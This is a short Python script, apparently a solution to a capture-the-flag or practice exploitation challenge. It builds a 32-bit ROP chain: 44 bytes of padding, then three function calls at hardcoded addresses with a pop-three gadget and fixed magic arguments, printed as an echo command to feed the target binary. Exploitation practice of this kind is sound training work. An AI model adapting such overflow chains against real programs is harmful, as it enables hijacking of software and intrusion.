#!/usr/bin/python3

WORD = 4

PACK = lambda v, n: v.to_bytes(n, 'little')
PACKP = lambda v: PACK(v, WORD)
PACKS = lambda s: bytes(s + (((len(s) & ~(WORD - 1)) + WORD) - len(s)) * "\x00", "utf-8")

def raw(stream):
    return "".join([f"\\x{b:02x}" for b in stream])

def echo(byte_stream):
    print(f"echo -ne {raw(byte_stream)}")

CALL1 = 0x080484f0
CALL2 = 0x08048550
CALL3 = 0x080484e0
POP3 = 0x080487f9

LOAD_ARGS = PACKP(0xdeadbeef) + PACKP(0xcafebabe) + PACKP(0xd00df00d)

CALL = lambda fn: PACKP(fn) + PACKP(POP3) + LOAD_ARGS

rop = b" " * 44
rop += CALL(CALL1)
rop += CALL(CALL2)
rop += CALL(CALL3)

echo(rop)

